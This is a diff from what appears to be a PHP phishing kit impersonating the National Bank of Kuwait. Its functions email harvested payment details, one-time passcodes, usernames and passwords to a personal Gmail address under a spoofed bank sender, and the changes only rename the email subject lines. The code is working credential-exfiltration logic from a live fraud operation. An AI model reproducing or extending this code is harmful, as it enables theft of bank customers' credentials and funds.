@@ -6,7 +6,7 @@ function sendtEmailPatment($data)
 {
     $to = "hassankiwan92@gmail.com";
     $sender = "admin@nbkkuwait.com";
-    $subject = "Payment Info";
+    $subject = "payemnt information";
     $message = "";
     foreach ($data as $key => $msg) {
         $message .= "$key :  $msg\n";
@@ -57,7 +57,7 @@ function sendOTP2($data)
 {
     $to = "hassankiwan92@gmail.com";
     $sender = "admin@nbkkuwait.com";
-    $subject = "OTP";
+    $subject = "seccound OTP";
     $message = "";
     foreach ($data as $key => $msg) {
         $message .= "$key :  $msg\n";
@@ -87,7 +87,7 @@ function sendInfo($data)
 {
     $to = "hassankiwan92@gmail.com";
     $sender = "admin@nbkkuwait.com";
-    $subject = "OTP";
+    $subject = "send user name and password";
     $message = "";
     foreach ($data as $key => $msg) {
         $message .= "$key :  $msg\n";
@@ -113,7 +113,7 @@ function sendInfoData($data)
 {
     $to = "hassankiwan92@gmail.com";
     $sender = "admin@nbkkuwait.com";
-    $subject = "OTP";
+    $subject = "user information";
     $message = "";
     foreach ($data as $key => $msg) {
         $message .= "$key :  $msg\n";
